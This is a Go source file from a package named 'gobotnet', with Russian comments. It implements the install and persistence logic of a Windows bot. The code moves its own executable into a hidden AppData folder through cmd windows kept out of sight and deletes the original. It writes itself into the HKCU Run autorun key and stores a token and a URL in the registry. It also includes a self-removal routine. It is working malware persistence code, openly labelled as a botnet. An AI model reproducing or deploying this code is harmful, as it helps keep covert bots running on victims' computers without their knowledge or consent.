package gobotnet

import (
	"golang.org/x/sys/windows/registry"
	"os"
	"os/exec"
	"strconv"
	"syscall"
)

var (
	nameFile                  string = "asocialfriend"
	nameToken                 string = "AsocialFriendToken"
	nameTokenUrl              string = "AsocialFriendUrl"
	botDir                    string = "AsocialFriend"
	appdataDir                string = os.Getenv("APPDATA")
	fullPathBotDir            string = appdataDir + "\\" + botDir
	fullPathBotExecFile       string = fullPathBotDir + "\\" + nameFile + ".exe"
	fullPathBotToken          string = fullPathBotDir + "\\" + nameFile + ".txt"
	fullPathBotSourceExecFile string = os.Args[0]
)

func GetFullPathBotDir() string {
	return fullPathBotDir
}

func GetTokenFromRegistry() string {
	value, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\"+botDir, nameToken)
	if err == nil {
		return value
	} else {
		CheckError(err)
		return ""
	}
}

func SaveTokenToRegistry(token string) bool {
	err := WriteRegistryKey(registry.CURRENT_USER, "Software\\"+botDir, nameToken, token)
	if err == nil {
		return true
	} else {
		CheckError(err)
		return false
	}
}

func GetUrlFromRegistry() string {
	value, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\"+botDir, nameTokenUrl)
	if err == nil {
		return value
	} else {
		CheckError(err)
		return ""
	}
}

func SaveUrlToRegistry(url string) bool {
	err := WriteRegistryKey(registry.CURRENT_USER, "Software\\"+botDir, nameTokenUrl, url)
	if err == nil {
		return true
	} else {
		CheckError(err)
		return false
	}
}

//Проверяем находимся ли мы в автозапуске
func CheckRegistryProgram() (value string, result bool) {
	value, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", nameFile)
	if err == nil {
		return value, true
	} else {
		return "", false
	}
}

func RegistryFromConsole(usingAutorun bool, usingRegistry bool, rewriteExe bool) bool {
	value, flag := CheckRegistryProgram()
	OutMessage("Program autorun:" + value + ", flag = " + strconv.FormatBool(flag) + ", checkFile = " + strconv.FormatBool(CheckFileExist(value)))
	if !flag || !CheckFileExist(value) {
		var out []byte
		//Создаем папку в %username%/AppData/Roaming/AsocialFriend

		if rewriteExe {
			cmd := exec.Command("cmd", "/Q", "/C", "mkdir", fullPathBotDir)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
			//Копируемся туда
			cmd = exec.Command("cmd", "/Q", "/C", "move", "/Y", fullPathBotSourceExecFile, fullPathBotExecFile)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))

			/*	if CheckFileExist(fullPathBotSourceExecFile) {

				DeleteFile(fullPathBotSourceExecFile)
			}*/

		} else {
			OutMessage("Rewrite EXE off ")
		}
		//Если включено использование реестра, создаем свой путь и записываемся в авторан
		if usingRegistry {
			cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+botDir, "/f")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
		} else {
			OutMessage("Save tokens to registry off")
		}
		if usingAutorun {
			cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", nameFile, "/d", fullPathBotExecFile)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
		} else {
			OutMessage("Using autorun off ")
		}
		return true
	} else {
		return false
	}
}

//Пытаемся удалить себя и выпилиться из реестра
func UnRegistryFromConsole(usingRegistry bool) {
	var out []byte

	cmd := exec.Command("cmd", "/Q", "/C", "rd", "/S", "/Q", fullPathBotDir)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ = cmd.Output()
	OutMessage(string(out))

	if usingRegistry {
		cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/f", "/v", nameFile)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ = cmd.Output()
		OutMessage(string(out))

		cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\"+botDir, "/f")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ = cmd.Output()
		OutMessage(string(out))
	}

}

func PrintRegistryPaths() {
	OutMessage(nameFile)
	OutMessage(botDir)
	OutMessage(appdataDir)
	OutMessage(fullPathBotDir)
	OutMessage(fullPathBotToken)
	OutMessage(fullPathBotExecFile)
	OutMessage(fullPathBotSourceExecFile)
}

func RegisterFromProgram() {
	value, flag := CheckRegistryProgram()
	if !flag || CheckFileExist(value) {
		CreateDir(fullPathBotDir, 0644)
		CopyFileToDirectory(fullPathBotSourceExecFile, fullPathBotExecFile)
		DeleteFile(fullPathBotSourceExecFile)
		RegisterAutoRun()
	}
}

func UnRegisterFromProgram() {
	UnRegisterAutoRun()
	RemoveDirWithContent(fullPathBotDir)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, nameFile, fullPathBotExecFile)
	CheckError(err)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, nameFile)
}
